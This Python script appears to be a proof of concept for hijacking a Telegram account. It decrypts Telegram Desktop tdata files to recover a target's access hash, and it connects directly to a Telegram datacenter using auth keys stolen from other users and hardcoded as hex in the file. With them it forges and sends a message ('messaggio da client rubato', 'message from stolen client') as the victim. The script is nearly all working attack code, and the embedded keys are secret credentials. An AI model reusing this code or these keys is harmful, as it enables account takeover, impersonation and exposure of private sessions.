from AndroidTelePorter.utils import auth_key
from pyrogram.raw.types import MsgsAck, UpdateShort
from telethon.tl.functions import PingDelayDisconnectRequest
from telethon.tl.functions.messages import SendMessageRequest

from tdata_parser import decrypt_domain_key_file, get_access_hash
from src.MtprotoSession import KeyNotFoundException
from read_capture import *
TELEGRAM_DATACENTER_IP = "149.154.167.92"


def start_session(cipher_obf_enc, cipher_obf_dec, init, auth_key, client_socket):
    session = MtprotoSession(auth_key)

    dummy_data = bytes.fromhex("628ff4fe800000004ca5e8dd25d2c402020000000eba544b377cc3b203736173c2eec6d2107ed19b")

    dummy_msg = TGMessage(plaintext_bytes=bytearray(dummy_data), session=session,
                                   msg_type="client_msg", silent=True, colored=True,
                                   instant=True, quickAck=False)

    print("MESSAGE TO SEND")
    print(dummy_msg)
    # print(to_hex_str(tg_message_to_send.message_data_plaintext))
    # print(deserialize_TL_message(decoded_edited_message).to_dict())
    obfuscated_bytes = cipher_obf_enc.encrypt(dummy_msg.complete_bytes_ciphertext)

    init_and_obfuscated_bytes = init + obfuscated_bytes
    # confirm = input("Are you sure? yes/(no)")


    client_socket.send(init_and_obfuscated_bytes)
    obfuscated_bad_salt_response = client_socket.recv(4086)
    bad_salt_response = cipher_obf_dec.decrypt(obfuscated_bad_salt_response)
    bad_salt_msg = TGMessage(ciphertext_bytes=bytearray(bad_salt_response), session=session,
                               msg_type="server_msg", silent=True, colored=True,
                               instant=True, quickAck=True)
    print(bad_salt_msg)
    session = bad_salt_msg.session
    return session

def edit_send_request_msg(text, user_id, access_hash):
    template_msg_bytes = bytes.fromhex("628ff4fe800000004ca5e8dd25d2c402020000000eba544b377cc3b203736173c2eec6d2107ed19b")
    template_msg = deserialize_TL_message(template_msg_bytes)
    template_msg.message = text
    template_msg.user_id = user_id
    template_msg.send_hash = access_hash
    template_msg.random_id = -1 * random.randrange(0, 1<<63)

    return  bytes(template_msg)
# def send_message(session :MtprotoSession, message_obg):


    # print(to_hex_str(init))
    # deobfuscated_bytes = bytearray(cipher_obf_enc.decrypt(init_and_obfuscated_bytes[64:]))
    # print(to_hex_str(tg_message_to_send.plaintext))
    # message = TGMessage(ciphertext_bytes = deobfuscated_bytes, msg_type="client_msg", silent=True, colored=True, instant=True, session = MtprotoSession(session.auth_key))
    # print(deserialize_TL_message(message.message_data_plaintext).to_dict())
    # print(to_hex_str(message.plaintext))
    #
    # print("Salt:")
    # print(to_hex_str(message.session.salt))
    # print("Session ID:")
    # print(to_hex_str(message.session.session_id))
    # print("SeqNo:")
    # print(bytes_to_int(message.seqNo, little= True))

def main():
    # auth_key_hex = "abf0f999217bef3d1c4830f983d18494d043b392867578de0d772eef4f9c55b0cc7edd664aafc65463f3cf5350c9edb1cdbcf7305be1c9753e129721c4fe23ae2e83ebacc8c5e62ef7dec1110ef4ecc52f67f7b089b3ff728a2904e793d11647329d4e76e012471d212d35272061f9d2ed90228e86bb99f37de981a2484ebc2439b3b763a0c2593b5204ab4d0a4389306c8d3226f0a2abe43ee2f9320cc340ce3e833c93ccb0b655a045949a72cdbe69428b5c2a459c1ca21a039b3fa5a719f06c2cbdb8959453872ce42cfb24617fdc0e4a48a3f4c9d2ab6ebbaa8c5790b230042bef8af674c69bf4eaaa68e141b16dc93ccee30c11ba90a27971ca1fdc91c9"

    #csx
    # auth_key_hex = "9dbf45e9b043c5d11b960acd0c59c4f56c1962f72775885fdf60557c2ab53081524016d9e36aaa31aab322d2719219bf155c7e2b922d56f9cc4c31a1db6f6cd5e662fcbc9303b43959f6f036dd28c79554cd5500a5ca5b28f1b57d97081f292b874a0570b349a00930f291510734f2cdb6746fa4a662768fb54b695f25dd2d4cf9545c2f25c78751ff2860d6da1dc5badd6d18f6fc369545c0bd18820e0f61261cbe10e037532a692161c91160cdb102dd40aa5d4737e5a8512514cf3c6831f2442d81fbaf88500788361c95b46b48b6027e53039d63fd01216140d55228bdf086a5c32aba2e625ef45b174e134a6fd7c0f968406f5a4e7f2e40f42d40a4c58a"

    #fstapane
    auth_key_hex = "28e2e6a71367ca479b6e953b31b9ced0b7683aea5012d7587e29dc8d471d2bb8ffd9a9adf896431082bbcc918fbe2a2209dbb96f94095c6ed5e0357d3a1012b3fc647a99b0b2d9316ef96107b70a60556514cc22ce12ac550a8ee269f95b38e381ddad8e098cb84187e6439505a58cf43756ce33432f8a5b365333e9156b744e79373d62e1624db21bc2aa1d610a0d4300570e9e7e0d3610f042ea3f98be91c1f0b549c3500ee76fffdf16e2b5e7a3b85de49a0a3a87a25a99f548a2aac14874116f3cf163ed8f24d8755b91a9b02d91fcee33babd924e3d36fa7d9c0bdd9a8be9e9e842b062b46ff612fcd9038235d0e7201593cb7fa174b05bce536ad405be"
    local_auth_key_hex = "ac4131c1e862472916754f80977fe38650c38acce7880f32c3a79bb15a9dc1facd467a9e136e1a52f2e5c24223e1985551d0e35056d5b4ba4455d141407ce6de452dcb0ac4d7771f68bf5560cb0cbdec71734976cabcd7f62617ff08ea401ce9cbf50290ce7d9c45f620224f23d658ca291996e25bb07ced9da494b1a54dc6a98246999a88f20b2d2479443e9427c34de63f29ca760131b13cc601b65179d53ecaad1ef2f4b9160bff5ffc30e5fecabdcc8a216fe5979adfdd5868f1d9ca8386c344463da2b2ed1beb09f1a52dd6df809046aba6d7770449de30da3327356dd18d5a54fbe8ce61460d4bbacac1a4a8845807fa2b507a25fec821f0100496ab70"
    #fstapane waydroid
    # auth_key_hex ="2a2f4721321b9bf6aa95757b7efff695aa8e1bb2869e78dbc7e43784e08b94f94d9422af52cb9ae26f0a2f7b900825e16ab5a0a57ab6c0a037e946bdc38eb119a49e4d42f070ecd22a62b50cd4a4ea8a80b191824293599f31d7e7419203f212e15b4b5d4a9d6bfff3d9e7211cece777b2ff675f7661b1b0f056bcf189bd02b80538f427438fc867de4d9e8200327b7bb934ae380715b9015ac2cfb7157051db299c87fc27283430383d44c6cdb8be86671909dd3896e009f0a4c35f62267d0ae995021a959b5c9cf3d07f255c5f971a3c2badd590a5b4d62e586f8fe22dbecc6593f0464ddd554a5bb27aa5830954cc9d82a5e8f71c85e03c2a36130caa4471"
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((TELEGRAM_DATACENTER_IP, 443))
    cipher_obf_enc, cipher_obf_dec, init = create_obfuscation_ciphers(0xef)
    session = start_session(cipher_obf_enc, cipher_obf_dec, init, bytes.fromhex(auth_key_hex), client_socket)
    # session.n_content_related += 1
    # local_key = decrypt_domain_key_file("/home/franc/Desktop/tdata/key_data", passcode=b"")
    local_key = bytes.fromhex(local_auth_key_hex)
    target_user_ID = 8636387877
    result = get_access_hash(
        "/home/franc/Desktop/tdata/D877F783D5D3EF8C/",
        local_key,
        user_id=target_user_ID,
        debug=False,
    )
    message = edit_send_request_msg("messaggio da client rubato", target_user_ID, result)
    sleep(3)
    new_msg = TGMessage(plaintext_bytes=bytearray(message), session=session,
                        msg_type="client_msg", silent=True, colored=True,
                        instant=True, quickAck=True)
    print("MESSAGE TO SEND")
    print(new_msg)
    obfuscated_bytes = cipher_obf_enc.encrypt(new_msg.complete_bytes_ciphertext)
    client_socket.send(obfuscated_bytes)











if __name__ == "__main__":
    main()